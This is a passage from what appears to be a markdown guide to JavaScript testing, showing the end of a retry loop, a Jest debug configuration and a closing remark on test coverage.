         break;
       } catch (error) {
         attempts++;
         if (attempts === maxAttempts) throw error;
         await new Promise(resolve => setTimeout(resolve, 1000));
       }
     }
   });
   ```

### Debug Configuration

```json
{
  "jest": {
    "verbose": true,
    "detectOpenHandles": true,
    "forceExit": true,
    "testTimeout": 30000
  }
}
```

---

*Testing is crucial for maintaining code quality and preventing regressions. Run tests frequently and maintain high coverage.*